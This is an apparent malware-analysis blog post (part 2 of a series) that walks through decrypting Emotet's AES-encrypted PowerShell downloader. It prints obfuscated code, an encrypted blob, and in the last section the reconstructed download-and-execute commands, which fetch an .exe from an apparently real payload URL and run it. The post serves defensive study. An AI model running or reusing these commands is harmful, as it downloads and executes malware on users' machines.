@@ -1,0 +1,97 @@
+Malware analysis: decoding Emotet, part 2
+In part two of our series on decoding Emotet, (you can catch up on part 1 here), we’ll cover analysis of the PowerShell code. Before we do that, however, it is a good idea to list some of the functions and calls that are used in the code for the execution.
+
+System.Runtime.InteropServices.Marshal: used for memory management
+SecureStringToBSTR: used to convert the secure string to decrypted data
+ConvertTo-SecureString: used to convert the encrypted data into secure string
+
+Encryption and PowerShell
+There are a couple of ways to encrypt data using PowerShell. DPAPI (Data Protection Application Programming Interface) is one method of encrypting with PowerShell, but it’s not what our malware uses. Emotet downloader malware uses AES to encrypt data. So let’s take a look at how AES works.
+If the data is encrypted using ConvertTo-SecureString but with NO key, PowerShell will by default use DPAPI. But it will only work for the logged in user on the machine it was encrypted on.
+If the data is encrypted using ConvertTo-SecureString with a key, PowerShell will use AES to encrypt the data and it can be decrypted on any machine, by anyone who has the encryption key. Emotet downloader uses AES for encrypting the code, with the key hardcoded in the malware itself.
+Code execution flow
+In order to get to the encrypted code, we need to first understand the flow of execution. Let’s have a look at how the code is structured.
+Code structure
+[RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe([RUNtIme.intEropseRVICEs.MarShal]::SeCURestrINgtogLoBaLaLloCUnicOde(
+From the snippet above, we need to extract useful code and then re-construct the structure so that we can follow the execution-flow and decrypt the code.
+[System.Runtime.InteropServices.Marshal]::
+PtrToStringAuto([System.Runtime.InteropServices.Marshal]::
+SecureStringToGlobalAllocUnicode
+Code analysis
+Now that we have a usable code structure, we can move on to the next step.
+The code above is looking for an encrypted data string that can then be run through SecureString for decryption.
+We now have access to the encrypted data from the VBA.
+76492d1116743f0423413b16050a5345MgB8ADYAYwB4AHAAdgAxAHEAdQAvAEkAVQBXADQANQBrAFUAWgBkAEIA
+NwBTAGcAPQA9AHwAYgAyADUAOQAwADMAYgBkAGMAOAA1AGMANwA0ADgAZgBhADUAYQBhAGIAYgBkADcAMwA1ADgAY
+wA3ADIANwA1ADAAZAA4AGEAYQBiADEANwBkADIAMwA3ADMANABlAGUAOAAxADUAZQA3ADAAOAAxADMAZQAyADIAZQ
+BlADUAOAAxADcAMQAxAGUAOAA4ADUAOQAzADcAMwBlADcAOABmADYAYwA5ADkANAA3ADMAMABhAGMAMwAzADIAMQA
+xADcAYwA2AGQAMgAxADAAZQAyADQAZgAyAGUAMQA...
+We will take that encrypted code and run it through ConvertTo-SecureString to start the decryption process.
+Since the data string is so long, it is a good idea to first save it as a file and then pass it to a variable in PowerShell.
+For the purpose of this analysis, we’ll save it as encrypted_code.txt.
+Now, we’ll pass it to a variable $vEncrypted:
+$vEncrypted = [IO.File]::ReadAllText(“absolute_path\encrypted_code.txt”)
+There are different ways to achieve the same result. Get-Content can also be used.
+Next, we run it through ConvertTo-SecureString to convert the encrypted string into a SecureString:
+$vDecrypted = ConvertTo-SecureString -String $vEncrypted -k (key goes here)
+NOTE: The malware authors would have previously used “ConvertFrom-SecureString” with a key (now hard-coded into the malware code) to encrypt the data. We’re simply reversing the process to extract the encrypted code.
+The last step is to now Marshal the SecureString through the SecureString to get the decrypted code.
+We’ll store the result in a variable to keep it clean and simple.
+$vResult = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($vDecrypted))
+Note that we have used SecureStringToBSTR instead of what the malware authors are using (SecureStringToGlobalAllocUnicode). The reason for this is that BSTR converts SecureString string value to a binary string (BSTR) recognized by COM. SecureStringToGlobalAllocUnicode would work as well.
+That’s it. $vResult should now have the completely decrypted code with the payload URLs.
+Step-by-step analysis
+Now that we know the code flow, let’s run it in PowerShell and put all the knowledge we have gained by analyzing the code to work.
+First of all, we’ll pass the encrypted code to the variable $vEncrypted:
+
+As you can see below, the encrypted data has now been stored in our variable vEncrypted:
+
+The next step now is to convert the encrypted data into SecureString by running it through ConvertTo-SecureString function. We will use the key that we found hard-coded into the malware code. We will pass the output to the variable vDecrypted:
+
+In the next step, we will confirm if the conversion was successful or not. As we can see below, the conversion was successful:
+
+Now, the final step to decrypt the data is to Marshal it through SecureStringToBSTR and pass the output to a variable, in this case, vResult:
+
+It’s now time to print the output of the variable and look at the decrypted code!
+
+We will further execute the code to extract the payload URLs and print them to console in a clean and nice way. As we can see in the code, variable $ADCX holds the URLs. We will use the split function as shown in the decrypted code and pass the output to $ADCX.
+
+All we have to do now is print the value of $ADCX to console and we get all the URLs in a list.
+
+We already have the network IOC. At this point, we can go home! But do we ever?
+Reconstructing the command-line arguments
+Let’s reconstruct the full command-line arguments, mostly as a reward for completing the analysis!
+Here’s our PowerShell code, structured and readable:
+
+And here’s the same code, cleaned and beautified:
+
+Now, we will look at all the variables and analyze them one-by-one to reconstruct the complete command-line arguments.
+$nsadasd
+This variable is assigned the value as the output of (new-object) random, which translates to System.random.
+Later in the code, this variable will be used to generate a random value (between 10,000 and 282,133) to be used as the file name for the downloaded payload. We’ll see that in action when we analyze $NSB.
+
+$YYU
+This variable is assigned the value “(new-object) System.Net.WebClient,” which will be used later with DownloadFile to download content from the Internet with the specified URI and save it as a local file. We can have a look at the value assigned to the variable in the image below. These are the attributes that will be used to start the download of the payload.
+
+$NSB
+As we saw earlier, this variable calls on the previously declared variable “nsadasd” in conjunction with “.next”, which turns the argument into the method “random.next.” This, in turn, would return a random number within the specified range (in this case, 10,000 – 282,133). As you can see below, it returns a different value each time it is executed.
+
+$SDC
+$SDC = $env:public + ‘\’ + $NSB + (‘.exe’);
+This variable puts together the absolute path for the payload, complete with the file name that is generated by variable NSB.
+
+We have already looked at the $ADCX variable and how to extract the URIs out of it. Now let’s reconstruct the entire command-line argument that is passed to the system for the malware to successfully download the payload, save it to local file, and execute it.
+Here’s the way the code is executed by the malware using variables we analyzed above:
+
+Let’s clean up the code to make it more readable:
+
+Now that we know the value that these variables hold, let’s reconstruct the final command-line arguments that will be passed to the system for execution:
+
+This is what it comes down to in the end:
+(New-Object) System.Net.WebClient.”DownloadFile”(http://lecap-services.fr/wiB9s.”ToString”(), C:\USers\Public\264415.exe);
+The command we have above will initiate the download of the data from the specified URI and save it to a local file as “C:\USers\Public\264415.exe”.
+(‘Invoke-Item’)(C:\USers\Public\264415.exe);
+And this final command will start the execution of the payload.
+Emotet: a complex malware
+Emotet is one of the most active threats seen in the wild, with campaigns serving this malware daily to potential victims across the globe. The level of code obfuscation and encryption used to hide the code is quite complex and well-executed. In fact, it is one of the most complex downloaders in circulation.
+That’s why we felt it was so important to help audiences understand Emotet in sufficient detail so that code variations or other changes in the future do not pose any major challenges to analysts trying to decode this malware. The more you know, the better and faster you are able to protect users from sophisticated malware attacks.
